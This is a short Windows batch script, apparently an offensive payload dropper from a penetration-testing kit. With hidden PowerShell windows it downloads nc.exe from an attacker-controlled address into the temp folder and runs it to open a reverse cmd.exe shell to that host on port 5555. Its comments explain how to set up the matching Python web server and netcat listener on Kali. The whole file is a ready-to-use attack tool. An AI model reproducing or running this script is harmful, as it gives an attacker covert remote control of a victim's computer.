@echo off
set ncpath=%TEMP%\nc.exe
set ncaddr=192.168.1.65
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://%ncaddr%/nc.exe' -OutFile '%ncpath%'"
powershell -WindowStyle Hidden -Command "Start-Process '%ncpath%' -ArgumentList '%ncaddr% 5555 -e cmd.exe' -WindowStyle Hidden"
:: Change IP Address before using it
:: Change filename
:: Before runing this Delivery Method start python server on port 80 and listen on run "nc -nvlp 5555" in kali